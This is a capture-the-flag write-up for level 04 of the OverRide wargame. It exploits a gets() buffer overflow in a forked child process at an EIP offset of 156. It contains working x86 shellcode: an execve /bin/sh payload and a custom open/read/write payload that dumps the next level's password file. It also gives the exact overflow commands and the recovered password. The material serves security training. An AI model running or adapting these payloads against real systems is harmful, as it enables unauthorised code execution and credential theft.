# Level04

This binary will call fork() to create a child process. This child process will wait for an input using gets(). We're getting used to overflow it, let's try to see if we can overflow to any valuable register (looking at you, EIP). First of all we need to follow the child process in gdb :

    (gdb) set follow-fork-mode child

Then the classic pattern generator :

    (gdb) r
    Starting program: /home/users/level04/level04 
    [New process 1822]
    Give me some shellcode, k
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process 1822]
    0x41326641 in ?? ()
    (gdb) i r
    eax            0x0      0
    ecx            0xf7fd08c4       -134412092
    edx            0xffffd550       -10928
    ebx            0x41386541       1094214977
    esp            0xffffd5f0       0xffffd5f0
    ebp            0x31664130       0x31664130
    esi            0x0      0
    edi            0x66413965       1715550565
    eip            0x41326641       0x41326641 <-- offset 156
    eflags         0x10282  [ SF IF RF ]
    cs             0x23     35
    ss             0x2b     43
    ds             0x2b     43
    es             0x2b     43
    fs             0x0      0
    gs             0x63     99

Now we can simply send our now well known shellcode from level01 in an environment variable, get its address, pass it to EIP aaaaaaaand :

    level04@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
    [...]
    (gdb) x/500s $esp
    [...]
    0xffffd795:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//   bi\211\343RS\211\341\260\v"
    0xffffd821:      "SHELL=/bin/bash"
    [...]
    (gdb) x/s 0xffffd803
    0xffffd803:      "1\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v"

Let's take an address that will land on one of the NOP operations, after SHELLCODE=, for instance 0xffffd7b1 (some addresses work, some don't, took a bit of trial and error, hence the 100 NOP at the beginning):

    level04@OverRide:~$ (python -c 'print "A" * 156 + "\xb1\xd7\xff\xff"') | ./level04 
    Give me some shellcode, k
    no exec() for you

After digging into the source code for a bit, we can see a call to ptrace that looks for an execve call in the parent process. If execve is detected, the parent will kill the child, and write "no exec() for you".

So we can't use execve, but nothing prevents us from using read and write to directly write the password to stdout instead of spawning a shell. Let's craft a new shellcode that does that :

        section .text
            global _start
    _start:
            ; clear registers
            xor     eax, eax
            xor     ebx, ebx
            xor     ecx, ecx
            xor     edx, edx
            jmp     two

    one:
            pop     ebx
            ; set syscall number for sys_open
            mov     al, 5
            xor     ecx, ecx
            int     0x80

            ; move return value (fd) to esi
            mov     esi, eax
            jmp     read

    exit:
            ; set syscall number for sys_exit
            mov     al, 1
            xor     ebx, ebx
            int     0x80

    read:
            mov     ebx, esi
            mov     al, 3
            sub     esp, 1          ; reserve space for read buffer
            lea     ecx, [esp]      ; load address of buffer
            mov     dl, 1           ; set write length to 1 byte
            int     0x80

            xor     ebx, ebx
            cmp     ebx, eax        ; check EOF
            je      exit

            mov     al, 4   ; set syscall number for sys_write 
            mov     bl, 1   ; set fd to stdout
            mov     dl, 1   ; set write length to 1 byte
            int     0x80

            add     esp, 1  ; deallocate buffer space
            jmp     read

    two:
            call    one
            db      "/home/users/level05/.pass"

[source (AT&T syntax, painful, i know)](https://shell-storm.org/shellcode/files/shellcode-73.html)

    $ nasm -f elf32 read_shellcode.s -o readpass
    objdump -d ./readpass

    ./readpass:     file format elf32-i386


    Disassembly of section .text:

    00000000 <_start>:
    0:   31 c0                   xor    %eax,%eax
    2:   31 db                   xor    %ebx,%ebx
    4:   31 c9                   xor    %ecx,%ecx
    6:   31 d2                   xor    %edx,%edx
    8:   eb 32                   jmp    3c <two>

    0000000a <one>:
    a:   5b                      pop    %ebx
    b:   b0 05                   mov    $0x5,%al
    d:   31 c9                   xor    %ecx,%ecx
    f:   cd 80                   int    $0x80
    11:   89 c6                   mov    %eax,%esi
    13:   eb 06                   jmp    1b <read>
    [...]

Our shellcode becomes :

    \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass

Crafted this way so that we can simply replace the file to read in at the end easily in case we need it later on.

Now let's redo the overflow using this code :

    level04@OverRide:~$ export PAYLOAD=$(python -c 'print "\x90"*100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass"')
    level04@OverRide:~$ gdb ./level04 

    (gdb) b main
    Breakpoint 1 at 0x80486cd
    (gdb) r
    Starting program: /home/users/level04/level04 

    Breakpoint 1, 0x080486cd in main ()
    x/500s $esp
    [...]
    0xffffded3:      "LESSOPEN=| /usr/bin/lesspipe %s"
    0xffffdef3:      "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322\353\062[\260\005\061\311\211\306\353\006\260\001\061\333\211\363\260\003\203\354\001\215\f$\262\0011\333\071\303t\346\260\004\263\001\262\001\203\304\001\353\337\350\311\377\377\377/home/users/level05/.pass"
    0xffffdfba:      "LESSCLOSE=/usr/bin/lesspipe %s %s"
    [...]
    level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf4\xde\xff\xff"') | ./level04 
    Give me some shellcode, k
    ^C
    level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf5\xde\xff\xff"') | ./level04 
    Give me some shellcode, k
    ^C
    level04@OverRide:~$ (python -c 'print "A" * 156 + "\xf6\xde\xff\xff"') | ./level04 
    Give me some shellcode, k
    3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
    child is exiting...
